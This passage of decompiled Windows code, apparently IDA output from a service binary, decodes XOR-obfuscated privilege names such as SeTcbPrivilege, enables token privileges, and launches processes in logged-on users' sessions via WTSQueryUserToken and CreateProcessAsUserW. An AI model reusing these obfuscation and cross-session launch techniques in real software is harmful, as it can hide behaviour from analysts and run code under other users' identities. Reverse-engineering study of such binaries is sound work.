    byte_1400D9EAD = (v5 - 5) ^ 0x72;
    byte_1400D9EAE = (v5 - 6) ^ 0x65;
    byte_1400D9EAF = (v5 - 7) ^ 0x61;
    byte_1400D9EB0 = (v5 - 8) ^ 0x73;
    byte_1400D9EB1 = (v5 - 9) ^ 0x65;
    byte_1400D9EB2 = (v5 - 10) ^ 0x51;
    byte_1400D9EB3 = (v5 - 11) ^ 0x75;
    byte_1400D9EB4 = (v5 - 12) ^ 0x6F;
    byte_1400D9EB5 = (v5 - 13) ^ 0x74;
    byte_1400D9EB6 = (v5 - 14) ^ 0x61;
    byte_1400D9EB7 = (v5 - 15) ^ 0x50;
    byte_1400D9EB8 = (v5 - 16) ^ 0x72;
    byte_1400D9EB9 = (v5 - 17) ^ 0x69;
    byte_1400D9EBA = (v5 - 18) ^ 0x76;
    byte_1400D9EBB = (v5 - 19) ^ 0x69;
    byte_1400D9EBC = (v5 - 20) ^ 0x6C;
    byte_1400D9EBD = (v5 - 21) ^ 0x65;
    byte_1400D9EBE = (v5 - 22) ^ 0x67;
    byte_1400D9EBF = (v5 - 23) ^ 0x65;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0x18ui64 )
  {
    sub_140004790(Src, 0x18ui64, 0i64);
    v5 = byte_1400D9E9E;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  v6[1] = 0i64;
  v6[2] = 0i64;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 24i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 24) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400D9EA8[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0x18 );
  return v3;
}
// 1400D9E2C: using guessed type int dword_1400D9E2C;
// 1400D9E40: using guessed type int dword_1400D9E40;
// 1400D9E48: using guessed type int dword_1400D9E48;
// 1400D9E4C: using guessed type int dword_1400D9E4C;
// 1400D9E9E: using guessed type char byte_1400D9E9E;
// 1400D9EA0: using guessed type int dword_1400D9EA0;
// 1400D9EA9: using guessed type char byte_1400D9EA9;
// 1400D9EAA: using guessed type char byte_1400D9EAA;
// 1400D9EAB: using guessed type char byte_1400D9EAB;
// 1400D9EAC: using guessed type char byte_1400D9EAC;
// 1400D9EAD: using guessed type char byte_1400D9EAD;
// 1400D9EAE: using guessed type char byte_1400D9EAE;
// 1400D9EAF: using guessed type char byte_1400D9EAF;
// 1400D9EB0: using guessed type char byte_1400D9EB0;
// 1400D9EB1: using guessed type char byte_1400D9EB1;
// 1400D9EB2: using guessed type char byte_1400D9EB2;
// 1400D9EB3: using guessed type char byte_1400D9EB3;
// 1400D9EB4: using guessed type char byte_1400D9EB4;
// 1400D9EB5: using guessed type char byte_1400D9EB5;
// 1400D9EB6: using guessed type char byte_1400D9EB6;
// 1400D9EB7: using guessed type char byte_1400D9EB7;
// 1400D9EB8: using guessed type char byte_1400D9EB8;
// 1400D9EB9: using guessed type char byte_1400D9EB9;
// 1400D9EBA: using guessed type char byte_1400D9EBA;
// 1400D9EBB: using guessed type char byte_1400D9EBB;
// 1400D9EBC: using guessed type char byte_1400D9EBC;
// 1400D9EBD: using guessed type char byte_1400D9EBD;
// 1400D9EBE: using guessed type char byte_1400D9EBE;
// 1400D9EBF: using guessed type char byte_1400D9EBF;

//----- (000000014001A400) ----------------------------------------------------
_QWORD *__fastcall sub_14001A400(void *Src)
{
  int v1; // er10
  unsigned int v2; // edi
  _QWORD *v3; // rbx
  int v4; // er9
  char v5; // r9
  _QWORD *v6; // rax
  bool v7; // cf
  _QWORD *v8; // rax
  __int64 v9; // rdx
  _QWORD *v10; // r8
  char v11; // al
  char v12; // cl

  v1 = dword_1400D9E8C;
  v2 = 0;
  v3 = Src;
  if ( dword_1400D9E8C & 1 )
  {
    v5 = byte_1400D9E88;
  }
  else
  {
    v4 = 69069 * dword_1400D9E48 + 1234567;
    v1 = dword_1400D9E8C | 1;
    dword_1400D9E48 = v4;
    dword_1400D9E8C |= 1u;
    dword_1400D9E2C = HIWORD(dword_1400D9E2C) + 36969 * (unsigned __int16)dword_1400D9E2C;
    LOBYTE(v4) = (BYTE2(dword_1400D9E4C) + 80 * dword_1400D9E4C) ^ v4;
    dword_1400D9E4C = HIWORD(dword_1400D9E4C) + 18000 * (unsigned __int16)dword_1400D9E4C;
    v5 = (((unsigned int)dword_1400D9E40 >> 13) ^ 32 * dword_1400D9E40 ^ dword_1400D9E40) + v4;
    dword_1400D9E40 ^= ((unsigned int)dword_1400D9E40 >> 13) ^ 32 * (dword_1400D9E40 ^ (dword_1400D9E40 << 12));
    byte_1400D9E88 = v5;
  }
  if ( !(v1 & 2) )
  {
    dword_1400D9E8C = v1 | 2;
    byte_1400D9E90[0] = v5 ^ 0x53;
    byte_1400D9E91 = (v5 - 1) ^ 0x65;
    byte_1400D9E92 = (v5 - 2) ^ 0x54;
    byte_1400D9E93 = (v5 - 3) ^ 0x63;
    byte_1400D9E94 = (v5 - 4) ^ 0x62;
    byte_1400D9E95 = (v5 - 5) ^ 0x50;
    byte_1400D9E96 = (v5 - 6) ^ 0x72;
    byte_1400D9E97 = (v5 - 7) ^ 0x69;
    byte_1400D9E98 = (v5 - 8) ^ 0x76;
    byte_1400D9E99 = (v5 - 9) ^ 0x69;
    byte_1400D9E9A = (v5 - 10) ^ 0x6C;
    byte_1400D9E9B = (v5 - 11) ^ 0x65;
    byte_1400D9E9C = (v5 - 12) ^ 0x67;
    byte_1400D9E9D = (v5 - 13) ^ 0x65;
  }
  *((_QWORD *)Src + 3) = 15i64;
  *((_QWORD *)Src + 2) = 0i64;
  *(_BYTE *)Src = 0;
  if ( *((_QWORD *)Src + 3) < 0xEui64 )
  {
    sub_140004790(Src, 0xEui64, 0i64);
    v5 = byte_1400D9E88;
  }
  if ( v3[3] < 0x10ui64 )
    v6 = v3;
  else
    v6 = (_QWORD *)*v3;
  *v6 = 0i64;
  *((_DWORD *)v6 + 2) = 0;
  *((_WORD *)v6 + 6) = 0;
  v7 = v3[3] < 0x10ui64;
  v3[2] = 14i64;
  if ( v7 )
    v8 = v3;
  else
    v8 = (_QWORD *)*v3;
  *((_BYTE *)v8 + 14) = 0;
  v9 = 0i64;
  do
  {
    if ( v3[3] < 0x10ui64 )
      v10 = v3;
    else
      v10 = (_QWORD *)*v3;
    v11 = byte_1400D9E90[v9++];
    v12 = v5 - v2++;
    *((_BYTE *)v10 + v9 - 1) = v12 ^ v11;
  }
  while ( v2 < 0xE );
  return v3;
}
// 1400D9E2C: using guessed type int dword_1400D9E2C;
// 1400D9E40: using guessed type int dword_1400D9E40;
// 1400D9E48: using guessed type int dword_1400D9E48;
// 1400D9E4C: using guessed type int dword_1400D9E4C;
// 1400D9E88: using guessed type char byte_1400D9E88;
// 1400D9E8C: using guessed type int dword_1400D9E8C;
// 1400D9E91: using guessed type char byte_1400D9E91;
// 1400D9E92: using guessed type char byte_1400D9E92;
// 1400D9E93: using guessed type char byte_1400D9E93;
// 1400D9E94: using guessed type char byte_1400D9E94;
// 1400D9E95: using guessed type char byte_1400D9E95;
// 1400D9E96: using guessed type char byte_1400D9E96;
// 1400D9E97: using guessed type char byte_1400D9E97;
// 1400D9E98: using guessed type char byte_1400D9E98;
// 1400D9E99: using guessed type char byte_1400D9E99;
// 1400D9E9A: using guessed type char byte_1400D9E9A;
// 1400D9E9B: using guessed type char byte_1400D9E9B;
// 1400D9E9C: using guessed type char byte_1400D9E9C;
// 1400D9E9D: using guessed type char byte_1400D9E9D;

//----- (000000014001A620) ----------------------------------------------------
signed __int64 sub_14001A620()
{
  __int64 v0; // rbx
  DWORD v1; // eax
  DWORD v2; // er8
  __int64 v3; // rcx
  signed __int32 v4; // eax
  int v5; // eax
  DWORD v6; // edx

  v0 = (unsigned int)_InterlockedCompareExchange(&dword_1400D8020, 0, 0);
  v1 = GetTickCount();
  v2 = v1;
  if ( (_DWORD)v0 == -1 )
  {
    v3 = v1 >> 28;
    v4 = -1;
LABEL_10:
    _InterlockedCompareExchange(&dword_1400D8020, v3, v4);
    return (v3 << 28) + (v2 & 0xFFFFFFF);
  }
  v5 = v0 & 0xF;
  v6 = v2 >> 28;
  if ( v2 >> 28 != v5 )
  {
    if ( v6 != v5 + 1 && (v6 || v5 != 15) )
      return 0xFFFFFFFFi64;
    v3 = (unsigned int)(v0 + 1);
    v4 = v0;
    goto LABEL_10;
  }
  v3 = v0;
  return (v3 << 28) + (v2 & 0xFFFFFFF);
}
// 1400D8020: using guessed type int dword_1400D8020;

//----- (000000014001A6B0) ----------------------------------------------------
bool __fastcall sub_14001A6B0(__int64 a1)
{
  __int64 v1; // r13
  bool result; // al
  int v3; // eax
  HANDLE *v4; // rsi
  HANDLE *v5; // rsi
  __int64 *v6; // rdi
  __int64 *v7; // rbx
  __int64 v8; // rdx
  HANDLE *v9; // r15
  void *v10; // r14
  signed __int64 v11; // r14
  signed __int64 v12; // rsi
  signed __int64 v13; // r8
  unsigned __int64 v14; // rsi
  unsigned __int64 v15; // rdx
  unsigned __int64 v16; // rdx
  signed __int64 v17; // rsi
  signed __int64 v18; // r8
  unsigned __int64 v19; // rsi
  unsigned __int64 v20; // rdx
  unsigned __int64 v21; // rdx
  __int64 **v22; // rax
  __int64 *j; // rax
  __int64 *i; // rax
  int v25; // eax
  unsigned __int64 v26; // rsi
  DWORD v27; // eax
  __int64 v28; // rdi
  int v29; // eax
  bool v30; // si
  __int64 *v31; // rdx
  __int64 *v32; // rax
  unsigned int v33; // er8
  HANDLE v34; // rbx
  int v35; // eax
  __int64 **v36; // rcx
  __int64 *l; // rcx
  __int64 *k; // rcx
  HANDLE v39; // rdi
  __int64 *v40; // rax
  __int64 *v41; // rcx
  __int64 *v42; // rbx
  unsigned int *v43; // rax
  int v44; // eax
  HANDLE *lpHandles[2]; // [rsp+30h] [rbp-A8h]
  __int64 v46; // [rsp+40h] [rbp-98h]
  int v47; // [rsp+48h] [rbp-90h]
  __int64 v48; // [rsp+50h] [rbp-88h]
  int v49[2]; // [rsp+58h] [rbp-80h]
  __int64 v50; // [rsp+60h] [rbp-78h]
  char v51; // [rsp+68h] [rbp-70h]
  __int64 v52; // [rsp+70h] [rbp-68h]
  char v53; // [rsp+78h] [rbp-60h]
  int v54; // [rsp+80h] [rbp-58h]
  HANDLE v55; // [rsp+88h] [rbp-50h]
  char v56; // [rsp+90h] [rbp-48h]
  __int64 v57; // [rsp+98h] [rbp-40h]
  HANDLE ExitCode; // [rsp+E8h] [rbp+10h]
  unsigned int v59; // [rsp+F0h] [rbp+18h]
  unsigned int *v60; // [rsp+F8h] [rbp+20h]

  v57 = -2i64;
  v1 = a1;
  while ( 1 )
  {
    result = sub_140036180();
    if ( result )
      return result;
    _mm_storeu_si128((__m128i *)lpHandles, (__m128i)0i64);
    v46 = 0i64;
    v50 = v1;
    v51 = 0;
    v3 = Mtx_lock(v1);
    if ( v3 )
      std::_Throw_C_error(v3);
    v51 = 1;
    sub_14001C0A0((__int64)lpHandles, 1ui64);
    v4 = lpHandles[1];
    if ( lpHandles[1] )
      *lpHandles[1] = *(HANDLE *)(v1 + 40);
    v5 = v4 + 1;
    lpHandles[1] = v5;
    v6 = *(__int64 **)(v1 + 8);
    v7 = (__int64 *)*v6;
    v8 = v46;
    v9 = lpHandles[0];
    while ( v7 != v6 )
    {
      v47 = *((_DWORD *)v7 + 8);
      v10 = (void *)v7[5];
      v48 = v7[5];
      if ( &v48 >= (__int64 *)v5 || v9 > (HANDLE *)&v48 )
      {
        if ( v5 == (HANDLE *)v8 && (unsigned __int64)((v8 - (signed __int64)v5) >> 3) < 1 )
        {
          v17 = v5 - v9;
          v18 = 0x1FFFFFFFFFFFFFFFi64;
          if ( (unsigned __int64)(0x1FFFFFFFFFFFFFFFi64 - v17) < 1 )
            std::_Xlength_error("vector<T> too long");
          v19 = v17 + 1;
          v20 = (v8 - (signed __int64)v9) >> 3;
          if ( v18 - (v20 >> 1) >= v20 )
            v21 = (v20 >> 1) + v20;
          else
            v21 = 0i64;
          if ( v21 < v19 )
            v21 = v19;
          sub_14001C0A0((__int64)lpHandles, v21);
          v8 = v46;
          v5 = lpHandles[1];
          v9 = lpHandles[0];
        }
        if ( v5 )
          *v5 = v10;
      }
      else
      {
        v11 = ((char *)&v48 - (char *)v9) >> 3;
        if ( v5 == (HANDLE *)v8 && (unsigned __int64)((v8 - (signed __int64)v5) >> 3) < 1 )
        {
          v12 = v5 - v9;
          v13 = 0x1FFFFFFFFFFFFFFFi64;
          if ( (unsigned __int64)(0x1FFFFFFFFFFFFFFFi64 - v12) < 1 )
            std::_Xlength_error("vector<T> too long");
          v14 = v12 + 1;
          v15 = (v8 - (signed __int64)v9) >> 3;
          if ( v13 - (v15 >> 1) >= v15 )
            v16 = (v15 >> 1) + v15;
          else
            v16 = 0i64;
          if ( v16 < v14 )
            v16 = v14;
          sub_14001C0A0((__int64)lpHandles, v16);
          v8 = v46;
          v5 = lpHandles[1];
          v9 = lpHandles[0];
        }
        if ( v5 )
          *v5 = v9[v11];
      }
      ++v5;
      lpHandles[1] = v5;
      if ( !*((_BYTE *)v7 + 25) )
      {
        v22 = (__int64 **)v7[2];
        if ( *((_BYTE *)v22 + 25) )
        {
          for ( i = (__int64 *)v7[1]; !*((_BYTE *)i + 25); i = (__int64 *)i[1] )
          {
            if ( v7 != (__int64 *)i[2] )
              break;
            v7 = i;
          }
          v7 = i;
        }
        else
        {
          v7 = (__int64 *)v7[2];
          for ( j = *v22; !*((_BYTE *)j + 25); j = (__int64 *)*j )
            v7 = j;
        }
      }
    }
    v25 = Mtx_unlock(v1);
    if ( v25 )
      std::_Throw_C_error(v25);
    v26 = v5 - v9;
    v27 = WaitForMultipleObjects(v26, v9, 0, 0xFFFFFFFF);
    if ( v27 )
    {
      v28 = v27;
      if ( v27 < v26 )
      {
        v52 = v1;
        v53 = 0;
        v29 = Mtx_lock(v1);
        if ( v29 )
          std::_Throw_C_error(v29);
        v53 = 1;
        v59 = 0;
        v30 = 1;
        v31 = *(__int64 **)(v1 + 8);
        v32 = (__int64 *)*v31;
        while ( v32 != v31 )
        {
          v33 = *((_DWORD *)v32 + 8);
          v54 = *((_DWORD *)v32 + 8);
          v34 = (HANDLE)v32[5];
          v55 = v34;
          if ( v34 == v9[v28] )
          {
            v59 = v33;
            LODWORD(ExitCode) = 0;
            GetExitCodeProcess(v9[v28], (LPDWORD)&ExitCode);
            if ( (_DWORD)ExitCode )
            {
              if ( (_DWORD)ExitCode == -1073741502 )
              {
                v30 = 0;
              }
              else
              {
                v30 = ++*(_DWORD *)(v1 + 48) < 10;
                v35 = 500 * *(_DWORD *)(v1 + 48);
                if ( v35 > 0 )
                {
                  v60 = (unsigned int *)(1000000i64 * v35 + *sub_140034EC0(&v56));
                  sub_140016E80(&v60);
                }
              }
            }
            else
            {
              v30 = byte_1400D9E28 == 0;
              *(_DWORD *)(v1 + 48) = 0;
            }
            CloseHandle(v34);
            sub_14001CA50((__int64 **)(v1 + 8), &v54);
            break;
          }
          if ( !*((_BYTE *)v32 + 25) )
          {
            v36 = (__int64 **)v32[2];
            if ( *((_BYTE *)v36 + 25) )
            {
              for ( k = (__int64 *)v32[1]; !*((_BYTE *)k + 25); k = (__int64 *)k[1] )
              {
                if ( v32 != (__int64 *)k[2] )
                  break;
                v32 = k;
              }
              v32 = k;
            }
            else
            {
              v32 = (__int64 *)v32[2];
              for ( l = *v36; !*((_BYTE *)l + 25); l = (__int64 *)*l )
                v32 = l;
            }
          }
        }
        if ( v30 )
        {
          v39 = sub_140019B40(&v59);
          if ( v39
            || (ExitCode = 0i64, (unsigned int)WTSQueryUserToken(v59, &ExitCode) == 1)
            && (v39 = sub_14001AC40(v1, &ExitCode), CloseHandle(ExitCode), v39) )
          {
            v40 = *(__int64 **)(v1 + 8);
            v41 = (__int64 *)v40[1];
            v42 = *(__int64 **)(v1 + 8);
            while ( !*((_BYTE *)v41 + 25) )
            {
              if ( *((_DWORD *)v41 + 8) >= v59 )
              {
                v42 = v41;
                v41 = (__int64 *)*v41;
              }
              else
              {
                v41 = (__int64 *)v41[2];
              }
            }
            if ( v42 == v40 || v59 < *((_DWORD *)v42 + 8) )
            {
              v60 = &v59;
              v43 = (unsigned int *)sub_1400161A0((_QWORD *)(v1 + 8), (__int64)&unk_1400D9E44, &v60);
              sub_140016610((void *)(v1 + 8), v49, v42, v43 + 8, (__int64)v43);
              v42 = *(__int64 **)v49;
            }
            v42[5] = (__int64)v39;
          }
        }
        v44 = Mtx_unlock(v1);
        if ( v44 )
          std::_Throw_C_error(v44);
      }
    }
    if ( v9 )
      operator delete(v9);
  }
}
// 140016E80: using guessed type __int64 __fastcall sub_140016E80(_QWORD);
// 140086F34: using guessed type __int64 __fastcall WTSQueryUserToken(_QWORD, _QWORD);
// 1400A1610: using guessed type void __stdcall std::_Throw_C_error(_DWORD);
// 1400A1618: using guessed type __int64 __fastcall Mtx_unlock(_QWORD);
// 1400A1620: using guessed type __int64 __fastcall Mtx_lock(_QWORD);
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);
// 1400D9E28: using guessed type char byte_1400D9E28;

//----- (000000014001AC40) ----------------------------------------------------
HANDLE __fastcall sub_14001AC40(__int64 a1, HANDLE *a2)
{
  HANDLE *v2; // r15
  HANDLE v4; // rbx
  char *v5; // rax
  __int64 v6; // rdx
  __int64 v7; // rcx
  char *v8; // rdi
  __int64 v9; // r14
  unsigned __int64 v10; // rax
  char *v11; // rsi
  __int64 v12; // rax
  _QWORD *v13; // rax
  _QWORD *v14; // rax
  WCHAR *v15; // r8
  LPVOID lpEnvironment; // [rsp+60h] [rbp-88h]
  struct _PROCESS_INFORMATION ProcessInformation; // [rsp+68h] [rbp-80h]
  void *v18; // [rsp+E8h] [rbp+0h]
  __int64 v19; // [rsp+F8h] [rbp+10h]
  unsigned __int64 v20; // [rsp+100h] [rbp+18h]
  LPWSTR lpCommandLine; // [rsp+108h] [rbp+20h]
  __int64 v22; // [rsp+118h] [rbp+30h]
  unsigned __int64 v23; // [rsp+120h] [rbp+38h]
  void *Src; // [rsp+128h] [rbp+40h]
  __int64 v25; // [rsp+138h] [rbp+50h]
  unsigned __int64 v26; // [rsp+140h] [rbp+58h]
  void *v27; // [rsp+148h] [rbp+60h]
  __int64 v28; // [rsp+158h] [rbp+70h]
  unsigned __int64 v29; // [rsp+160h] [rbp+78h]

  ProcessInformation.hProcess = (HANDLE)-2i64;
  v2 = a2;
  if ( !*a2 )
    return 0i64;
  v4 = 0i64;
  v5 = (char *)sub_140019640(&Src);
  v8 = v5;
  v20 = 7i64;
  v19 = 0i64;
  LOWORD(v18) = 0;
  v9 = *((_QWORD *)v5 + 2);
  if ( v9 )
  {
    v10 = *((_QWORD *)v5 + 3);
    if ( v10 < 0x10 )
      v11 = v8;
    else
      v11 = *(char **)v8;
    if ( v10 >= 0x10 )
      v8 = *(char **)v8;
    v12 = sub_140031970(v7, v6);
    sub_140030C60(v8, &v11[v9], &v18, v12);
  }
  v13 = sub_14007A1A0();
  v14 = sub_140003DE0(&v27, v13, &v18);
  v23 = 7i64;
  v22 = 0i64;
  LOWORD(lpCommandLine) = 0;
  sub_140005050(&lpCommandLine, v14, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  if ( v29 >= 8 )
    operator delete(v27);
  v29 = 7i64;
  v28 = 0i64;
  LOWORD(v27) = 0;
  if ( v20 >= 8 )
    operator delete(v18);
  v20 = 7i64;
  v19 = 0i64;
  LOWORD(v18) = 0;
  if ( v26 >= 0x10 )
    operator delete(Src);
  v26 = 15i64;
  v25 = 0i64;
  LOBYTE(Src) = 0;
  memset(&ProcessInformation.dwProcessId, 0, 0x68ui64);
  ProcessInformation.hProcess = 0i64;
  ProcessInformation.hThread = 0i64;
  *(_QWORD *)&ProcessInformation.dwProcessId = 0i64;
  lpEnvironment = 0i64;
  CreateEnvironmentBlock(&lpEnvironment, *v2, 0i64);
  v15 = (WCHAR *)&lpCommandLine;
  if ( v23 >= 8 )
    v15 = lpCommandLine;
  if ( CreateProcessAsUserW(
         *v2,
         0i64,
         v15,
         0i64,
         0i64,
         0,
         0x420u,
         lpEnvironment,
         0i64,
         (LPSTARTUPINFOW)&ProcessInformation.dwProcessId,
         &ProcessInformation) )
  {
    v4 = ProcessInformation.hProcess;
    CloseHandle(ProcessInformation.hThread);
  }
  if ( lpEnvironment )
    DestroyEnvironmentBlock();
  if ( v23 >= 8 )
    operator delete(lpCommandLine);
  return v4;
}
// 140031970: using guessed type __int64 __cdecl sub_140031970(_QWORD, _QWORD);
// 140086F16: using guessed type __int64 __fastcall CreateEnvironmentBlock(_QWORD, _QWORD, _QWORD);
// 140086F1C: using guessed type __int64 DestroyEnvironmentBlock(void);

//----- (000000014001AE70) ----------------------------------------------------
__int64 __fastcall sub_14001AE70(void **a1, __int64 a2)
{
  __int64 v2; // rbx
  void **v3; // rdi
  _QWORD *v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  _QWORD *v7; // rax
  __int64 v8; // rax
  __int64 v9; // rax
  _QWORD *v10; // rax
  __int64 v11; // rax
  __int64 v12; // rax
  __int64 v13; // rax
  char v15; // [rsp+28h] [rbp-31h]
  char v16; // [rsp+40h] [rbp-19h]
  __int64 v17; // [rsp+58h] [rbp-1h]
  __int64 v18; // [rsp+60h] [rbp+7h]
  void *Src; // [rsp+68h] [rbp+Fh]
  void *v20; // [rsp+70h] [rbp+17h]
  __int64 v21; // [rsp+78h] [rbp+1Fh]
  unsigned __int64 v22; // [rsp+80h] [rbp+27h]
  unsigned __int64 v23; // [rsp+88h] [rbp+2Fh]

  v18 = -2i64;
  v2 = a2;
  v3 = a1;
  v17 = a2;
  sub_14006BD10((__int64)&v16, 0);
  sub_14006BC80((__int64)&v15, v3 + 8);
  v4 = sub_140019940(&Src);
  v5 = sub_14006C0C0((__int64)&v16, v4);
  v6 = sub_14006C4B0(v5, "b");
  sub_14006BFB0(v6);
  if ( v22 >= 0x10 )
    operator delete(Src);
  v22 = 15i64;
  v21 = 0i64;
  LOBYTE(Src) = 0;
  sub_14006BF10((__int64)&v15);
  sub_14006BC80((__int64)&v15, v3);
  v7 = sub_140019940(&Src);
  v8 = sub_14006C0C0((__int64)&v16, v7);
  v9 = sub_14006C4B0(v8, "d");
  sub_14006BFB0(v9);
  if ( v22 >= 0x10 )
    operator delete(Src);
  v22 = 15i64;
  v21 = 0i64;
  LOBYTE(Src) = 0;
  sub_14006BF10((__int64)&v15);
  sub_14006BC80((__int64)&v15, v3 + 4);
  v10 = sub_140019940(&Src);
  v11 = sub_14006C0C0((__int64)&v16, v10);
  v12 = sub_14006C4B0(v11, "o");
  sub_14006BFB0(v12);
  if ( v22 >= 0x10 )
    operator delete(Src);
  v22 = 15i64;
  v21 = 0i64;
  LOBYTE(Src) = 0;
  sub_14006BF10((__int64)&v15);
  v13 = sub_140072820((__int64)&Src);
  (*(void (__fastcall **)(__int64, __int64, char *))(*(_QWORD *)v13 + 8i64))(v13, v2, &v16);
  Src = &off_1400A2B70;
  if ( v23 >= 0x10 )
    operator delete(v20);
  v23 = 15i64;
  v22 = 0i64;
  LOBYTE(v20) = 0;
  sub_14007E240(&Src);
  sub_14006BF10((__int64)&v16);
  return v2;
}
// 1400A2B70: using guessed type __int64 (__fastcall *off_1400A2B70)(void *);

//----- (000000014001B080) ----------------------------------------------------
int __fastcall sub_14001B080(LPCSTR lpName, char a2)
{
  char v2; // bl
  int result; // eax
  DWORD v4; // eax
  unsigned __int8 v5; // bl
  HANDLE v6; // rax
  HANDLE TokenHandle; // [rsp+30h] [rbp-38h]
  struct _LUID Luid; // [rsp+38h] [rbp-30h]
  struct _TOKEN_PRIVILEGES NewState; // [rsp+40h] [rbp-28h]

  v2 = a2;
  if ( *((_QWORD *)lpName + 3) >= 0x10ui64 )
    lpName = *(LPCSTR *)lpName;
  result = LookupPrivilegeValueA(0i64, lpName, &Luid);
  if ( result )
  {
    NewState.Privileges[0].Luid = Luid;
    v4 = v2 != 0 ? 2 : 0;
    NewState.PrivilegeCount = 1;
    v5 = 0;
    NewState.Privileges[0].Attributes = v4;
    TokenHandle = 0i64;
    v6 = GetCurrentProcess();
    if ( OpenProcessToken(v6, 0x20u, &TokenHandle) )
    {
      v5 = 0;
      if ( AdjustTokenPrivileges(TokenHandle, 0, &NewState, 0x10u, 0i64, 0i64) )
        v5 = 1;
      CloseHandle(TokenHandle);
    }
    result = v5;
  }
  return result;
}

//----- (000000014001B230) ----------------------------------------------------
void sub_14001B230()
{
  byte_1400D9E28 = 1;
}
// 1400D9E28: using guessed type char byte_1400D9E28;

//----- (000000014001B240) ----------------------------------------------------
bool __fastcall sub_14001B240(__int64 a1, _DWORD *a2)
{
  _DWORD *v2; // r14
  __int64 v3; // rsi
  int v4; // eax
  volatile signed __int32 *v5; // rax
  HANDLE v6; // rax
  void (__fastcall ***v7)(void *, _QWORD); // rbx
  HANDLE v8; // rax
  char *v9; // r15
  unsigned int *v10; // r15
  unsigned int *v11; // r12
  unsigned int *i; // rbx
  unsigned int v13; // er8
  __int64 v14; // rax
  __int64 v15; // rcx
  __int64 v16; // rdx
  __int64 *v17; // rax
  HANDLE v18; // rdi
  bool v19; // bl
  int v20; // eax
  bool result; // al
  int v22; // eax
  void (__fastcall ***lpMem)(void *, _QWORD); // [rsp+20h] [rbp-98h]
  __int64 v24; // [rsp+28h] [rbp-90h]
  __int64 v25; // [rsp+30h] [rbp-88h]
  __int64 v26; // [rsp+38h] [rbp-80h]
  bool (__fastcall *v27)(__int64); // [rsp+40h] [rbp-78h]
  __int64 v28; // [rsp+48h] [rbp-70h]
  __int64 v29; // [rsp+50h] [rbp-68h]
  char v30; // [rsp+58h] [rbp-60h]
  void *v31[2]; // [rsp+60h] [rbp-58h]
  __int64 v32; // [rsp+70h] [rbp-48h]
  LPVOID v33; // [rsp+D0h] [rbp+18h]
  HANDLE hObject; // [rsp+D8h] [rbp+20h]

  v26 = -2i64;
  v2 = a2;
  v3 = a1;
  v29 = a1;
  v4 = Mtx_lock(a1);
  if ( v4 )
    std::_Throw_C_error(v4);
  v30 = 1;
  if ( !(unsigned __int8)sub_1400362F0((__int64 *)(v3 + 32)) )
  {
    ResetEvent(*(HANDLE *)(v3 + 40));
    v27 = sub_14001A6B0;
    v28 = v3;
    sub_140016E50((char **)&v33, &v27);
    sub_14001DAE0(&v33);
    sub_140018FB0((volatile signed __int32 **)(v3 + 32), (volatile signed __int32 **)&v33);
    v5 = (volatile signed __int32 *)v33;
    lpMem = (void (__fastcall ***)(void *, _QWORD))v33;
    v33 = 0i64;
    if ( lpMem && !_InterlockedDecrement(v5 + 2) )
    {
      (**lpMem)(lpMem, 0i64);
      v6 = GetProcessHeap();
      HeapFree(v6, 0, lpMem);
    }
    sub_1400366B0((volatile signed __int32 **)&v33);
    v7 = (void (__fastcall ***)(void *, _QWORD))v33;
    if ( v33 && !_InterlockedDecrement((volatile signed __int32 *)v33 + 2) )
    {
      (**v7)(v7, 0i64);
      v8 = GetProcessHeap();
      HeapFree(v8, 0, v7);
    }
  }
  _mm_storeu_si128((__m128i *)v31, (__m128i)0i64);
  v32 = 0i64;
  if ( *v2 )
  {
    sub_14001BFD0((__int64)v31, 1ui64);
    v9 = (char *)v31[1];
    if ( v31[1] )
      *(_DWORD *)v31[1] = *v2;
    v10 = (unsigned int *)(v9 + 4);
    v31[1] = v10;
  }
  else
  {
    sub_140019520(v31);
    v10 = (unsigned int *)v31[1];
  }
  v11 = (unsigned int *)v31[0];
  if ( ((char *)v10 - (char *)v31[0]) & 0xFFFFFFFFFFFFFFFCui64 )
  {
    sub_14001B170(v3);
    for ( i = v11; i != v10; ++i )
    {
      v13 = *i;
      if ( *i )
      {
        v14 = *(_QWORD *)(v3 + 8);
        v15 = *(_QWORD *)(v14 + 8);
        v16 = *(_QWORD *)(v3 + 8);
        while ( !*(_BYTE *)(v15 + 25) )
        {
          if ( *(_DWORD *)(v15 + 32) >= v13 )
          {
            v16 = v15;
            v15 = *(_QWORD *)v15;
          }
          else
          {
            v15 = *(_QWORD *)(v15 + 16);
          }
        }
        if ( v16 == v14 || v13 < *(_DWORD *)(v16 + 32) )
        {
          v25 = *(_QWORD *)(v3 + 8);
          v17 = &v25;
        }
        else
        {
          v24 = v16;
          v17 = &v24;
        }
        if ( *v17 == *(_QWORD *)(v3 + 8) )
        {
          hObject = 0i64;
          if ( (unsigned int)WTSQueryUserToken(v13, &hObject) == 1 )
          {
            v18 = sub_14001AC40(v3, &hObject);
            CloseHandle(hObject);
            if ( v18 )
            {
              *sub_140019030((void *)(v3 + 8), i) = (__int64)v18;
              SetEvent(*(HANDLE *)(v3 + 40));
            }
          }
        }
      }
    }
    v19 = *(_QWORD *)(v3 + 16) != 0i64;
    if ( v11 )
      operator delete(v11);
    v20 = Mtx_unlock(v3);
    if ( v20 )
      std::_Throw_C_error(v20);
    result = v19;
  }
  else
  {
    if ( v31[0] )
      operator delete(v31[0]);
    v22 = Mtx_unlock(v3);
    if ( v22 )
      std::_Throw_C_error(v22);
    result = 0;
  }
  return result;
}
// 14001B170: using guessed type __int64 __fastcall sub_14001B170(_QWORD);
// 140086F34: using guessed type __int64 __fastcall WTSQueryUserToken(_QWORD, _QWORD);
// 1400A1610: using guessed type void __stdcall std::_Throw_C_error(_DWORD);
